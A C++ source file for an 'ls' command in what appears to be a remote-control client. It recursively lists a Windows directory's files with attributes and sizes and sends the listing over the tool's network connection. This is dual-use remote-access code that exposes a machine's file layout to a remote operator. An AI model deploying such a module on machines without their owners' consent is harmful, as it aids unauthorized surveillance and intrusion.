#include "Command_ls.h"
#include "stdafx.h"

#include "Logger.h"
#include "Network.h"
#include "Settings.h"

Command_ls::Command_ls()
{
}

Command_ls::~Command_ls()
{
}

bool Command_ls::OnExecute(const std::vector<std::wstring> &args)
{
	if (!(args.size() > 1))
	{
		VLog(LERROR, L"ls: missing argument");
		return false;
	}


	std::wstring fileArgs = Util::join_at_index(args, L" ", 1);
	std::wstring out = L"x=";

	if (fileArgs.back() != L'\\')
		fileArgs.push_back(L'\\');

	bool ret = ListFiles(fileArgs, out, 0, 1);
	if (!ret) return false;

	network.SendTextW(V_NET_FILE_DATA, out.c_str());

	return true;
}

bool Command_ls::ListFiles(const std::wstring& dir, std::wstring& str, int lvl, int maxlvl)
{
	if (lvl > maxlvl) return true;

	std::wstring dirPattern = dir + L"*";

	WIN32_FIND_DATA ffd;
	HANDLE hFind = FindFirstFile(dirPattern.c_str(), &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		if (lvl == 0) VLog(LERROR, L"ls: invalid directory");
		return false;
	}

	do
	{
		DWORD64 tmp = MAXDWORD;
		tmp += 1;
		DWORD64 size = (ffd.nFileSizeHigh * tmp) + ffd.nFileSizeLow;

		str.append(dir);
		str.append(ffd.cFileName);
		str.append(L"|");
		str.append(std::to_wstring(ffd.dwFileAttributes));
		str.append(L"|");
		str.append(std::to_wstring(size));
		str.append(L"\n");

		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
			&& wcscmp(ffd.cFileName, L".") != 0 && wcscmp(ffd.cFileName, L".."))
		{
			std::wstring nextDir = dir;
			nextDir.append(ffd.cFileName);
			nextDir.append(L"\\");
			ListFiles(nextDir, str, lvl + 1, maxlvl);
		}

	} while (FindNextFile(hFind, &ffd) != 0);
	FindClose(hFind);

	return true;
}